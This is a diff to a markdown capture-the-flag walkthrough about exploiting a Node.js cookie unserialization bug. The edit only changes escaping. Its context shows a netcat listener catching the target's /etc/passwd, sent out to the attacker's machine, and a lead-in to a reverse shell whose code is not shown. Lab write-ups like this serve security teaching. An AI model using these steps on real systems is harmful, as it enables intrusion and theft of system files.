@@ -29,7 +29,7 @@
 When we access the http service of the server we get the following message: "Under Construction, Come Back Later!". But, the second request throws an exception.
 Reading the output of the error we know that there's something wrong with the unserialization of the cookie. If we decode the cookie we get something like:  
 
->{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires**\=\"\:**Friday, 13 Oct 2018 00:00:00 GMT"}  
+>{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires **\=\"\:** Friday, 13 Oct 2018 00:00:00 GMT"}  
 
 We see that there's an error in the json format. When we correct this we get a "Hello Admin" message.  
 
@@ -58,10 +58,10 @@ And we get the content of /etc/passwd:
 root@kali:~# nc -nvlp 8888  
 >listening on [any] 8888 ...  
 >connect to [192.168.111.4] from (UNKNOWN) [192.168.111.3] 41624  
->root:x:0:0:root:/root:/bin/bash  
+>root\:x\:0:0:root:/root:/bin/bash  
 >...  
->nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash  
->fireman:x:1002:1002::/home/fireman:/bin/bash  
+>nodeadmin\:x\:1001:1001::/home/nodeadmin:/bin/bash  
+>fireman\:x\:1002:1002::/home/fireman:/bin/bash  
 
 Now, let's get our reverse shell. With the following code:  
   
